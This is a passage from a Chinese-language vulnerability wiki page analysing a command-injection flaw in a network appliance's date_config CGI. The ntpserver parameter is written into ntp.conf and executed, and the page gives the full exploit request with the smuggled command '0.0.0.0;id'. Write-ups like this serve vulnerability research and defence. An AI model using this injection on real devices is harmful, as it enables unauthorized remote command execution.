<span class="s2">    &lt;input type=hidden name=ifname value=\&quot;fxp1\&quot;&gt;&lt;/input&gt;&lt;/td&gt;</span>
<span class="s2">&lt;/tr&gt;</span>
<span class="s2">&lt;/table&gt;</span>
<span class="s2">&lt;/form&gt;</span>
<span class="s2">&lt;/table&gt;</span>
<span class="s2">&lt;/center&gt;</span>
<span class="s2">&lt;/body&gt;</span>
<span class="s2">&lt;/html&gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>
</code></pre></div>
<p><img alt="img" src="../../../.vuepress/public/img/1628931891389-0549f9d3-8e94-4a25-b32c-79c350808160.png" /></p>
<p><strong>${CGI_ntpserver} 参数可以发现，受用户可控</strong></p>
<p><img alt="img" src="../../../.vuepress/public/img/1628931980080-7302ea8c-e306-49ac-a4ad-3a93ac8d2724.png" /></p>
<p>主要位置注意这个代码位置</p>
<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ntpserver_ip=</span><span class="si">${</span><span class="nv">CGI_ntpserver</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="si">${</span><span class="nv">PGETC</span><span class="si">}</span>/ntp.conf
</code></pre></div>
<p><strong>这里将参数写入 ${PGETC}/ntp.conf 文件，查看文件位置，看一下变量 ${PGETC} 配置</strong></p>
<p><img alt="img" src="../../../.vuepress/public/img/1628932135524-80885cc7-ec0c-4c70-9145-3c92bbeb92c2.png" /></p>
<p>在 /etc 目录下找到了这个文件</p>
<p><img alt="img" src="../../../.vuepress/public/img/1628932193427-d571379b-0d7e-44ce-8005-6d077e69df02.png" /></p>
<p>继续向下看</p>
<p><img alt="img" src="../../../.vuepress/public/img/1628932309063-96a9127b-56b3-4dd7-bb51-09cf825c01bd.png" /></p>
<p>可以发现当 ntp.conf 文件中写入其他参数就会造成命令执行，思路如下</p>
<p><img alt="img" src="../../../.vuepress/public/img/1628932750956-a0ee7056-7ccd-4cb3-a4df-9a5ad61b7c00.png" /></p>
<p>构造请求</p>
<div class="highlight"><pre><span></span><code><span class="x">POST /cgi-bin/Maintain/date_config</span>

<span class="x">ntpserver=0.0.0.0;id&amp;year=2021&amp;month=08&amp;day=14&amp;hour=17&amp;minute=04&amp;second=50&amp;tz=Asiz&amp;bcy=Shanghai&amp;ifname=fxp1</span>
</code></pre></div>
<p><img alt="img" src="../../../.vuepress/public/img/1628933229066-f8d6c653-898f-4ca4-811e-6d9ee9f9e528.png" /></p>
<p><strong>成功写入 ntp.conf 文件为 0.0.0.0;id, 再次访问该页面就可以获取命令执行结果</strong></p>
<p><img alt="img" src="../../../.vuepress/public/img/1628933214110-726666cf-d57e-4ccc-91e2-72a5d93bb27e.png" /></p>
<p>交互处可进行命令拼接造成注入</p>
<p><img alt="img" src="../../../.vuepress/public/img/1628866823919-229f07f4-6805-40ce-bc7b-46c33387e40a.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Samsung/%EF%BC%88CVE-2017-14262%EF%BC%89Samsung%20NVR%20devices%20%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Samsung/%EF%BC%88CVE-2017-14262%EF%BC%89Samsung%20NVR%20devices%20%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2017-14262）Samsung NVR devices 漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Panabit%20Panalog%20sy_addmount.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Panabit%20Panalog%20sy_addmount.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Panabit Panalog sy_addmount.php 远程命令执行漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>